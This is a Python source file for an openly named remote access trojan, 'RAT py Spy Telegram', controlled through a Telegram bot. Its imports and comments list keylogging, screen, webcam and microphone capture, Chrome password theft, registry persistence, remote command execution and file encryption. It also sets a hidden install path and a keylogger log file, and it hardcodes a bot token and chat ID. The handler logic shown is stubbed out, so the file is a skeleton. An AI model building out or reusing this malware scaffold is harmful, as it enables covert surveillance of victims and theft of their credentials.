#██████╗░░█████╗░████████╗  ██████╗░██╗░░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗╚██╗░██╔╝
#██████╔╝███████║░░░██║░░░  ██████╔╝░╚████╔╝░
#██╔══██╗██╔══██║░░░██║░░░  ██╔═══╝░░░╚██╔╝░░
#██║░░██║██║░░██║░░░██║░░░  ██║░░░░░░░░██║░░░
#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░░░░░░░╚═╝░░░
#░██████╗██████╗░██╗░░░██╗ ████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗
#██╔════╝██╔══██╗╚██╗░██╔╝ ╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║
#╚█████╗░██████╔╝░╚████╔╝░ ░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║
#░╚═══██╗██╔═══╝░░░╚██╔╝░░ ░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
#██████╔╝██║░░░░░░░░██║░░░ ░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
#╚═════╝░╚═╝░░░░░░░░╚═╝░░░ ░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝ v4.0

#region Import Library's
#######
##





import os, os.path, platform, ctypes
import logging
from winreg import *
from consoleTools import consoleDisplay as cd
from PIL import ImageGrab                                                 # /capture_pc
from shutil import copyfile, copyfileobj, rmtree, move                    # /ls, /pwd, /cd, /copy, /mv
from sys import argv, path, stdout                                        # console output
from json import loads                                                    # reading json from ipinfo.io
from winshell import startup                                              # persistence
from tendo import singleton                                               # this makes the application exit if there's another instance already running
from win32com.client import Dispatch                                      # WScript.Shell
from time import strftime, sleep
from subprocess import Popen, PIPE                                        # /cmd_exec
from getpass import getuser                                               # Obtiene el nombre del usuario
import psutil                                                             # updating
from pynput.keyboard import Key, Listener
import shutil
import win32clipboard                                                     # register clipboard
import sqlite3                                                            # get chrome passwords
import win32crypt                                                         # get chrome passwords
import base64                                                             # /encrypt_all
import datetime                                                           # /schedule
import time
import threading                                                          # /proxy, /schedule
import proxy
import pyaudio, wave                                                      # /hear
import telepot, requests                                                  # telepot       => telegram, requests       => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import pythoncom, pyHook                                                # keylogger
import socket                                                             # internal IP
import getpass                                                            # get username
import collections
import urllib                                                             # wallpaper
import cv2                                                                # webcam
import yagmail
from datetime import datetime
from ctypes import *                                                      # fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145

# pip install python-telegram-bot


#######

#endregion

#region Variables Globales
# Configuración de Inicio


T_TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # < Token del Bot
T_ID = "831756903"                                            # < ID Único
#Config Trojan           True = Active || False =  disabled
T_STARTUP = False
T_TROJAN =  False
T_DELAY = 1
T_CONSOLE_DEBUG = True

T_NAME_EXE = "RATpy.SpyTelegram.exe"
T_NAME_REG = "RATpy.SpyTelegram"

T_PATH_HIDDEN = r"C:\Users\Public\RAT_Telegram"

#Config Keylogger
T_KEYLOGGER = False                                   # Activate?
T_PATH_LOG = r"C:\Users\Public\RAT_Telegram"          # Save Path
T_NAME_LOG = r"reg.k"                                 # Filename key
T_PATH_KEY = T_PATH_LOG+ "\\"+T_NAME_LOG                  # complete path

#endregion

def Information():  # Show Console Information
    print("[RAT Config] Your ID is: " + T_ID)
    print("[RAT Config] Your TOKEN is: " + T_TOKEN)
    print("[RAT Config] Delayed start: " + str(T_DELAY))

#region Commands TelegramBot
def Handle(msg):
    """
    print(msg)
    ID = msg['chat']['id']
    response = "";

    if 'text' in msg:
        print("Hay texto")
    """


#endregion


# Start Script
if __name__ == '__main__':
    print("[RAT] Start")
    Information() # Show Information

    #me = singleton.SingleInstance()

    # Telegram
    #bot = telepot.Bot(T_TOKEN)    # Vincula token
    #bot.message_loop(Handle)#Handle)    # Recibe Commands



    # Espera comandos
    print("Esperando comandos...")
    # pythoncom.PumpMessages()  # Escucha los comandos

    while 1:
     time.sleep(10)

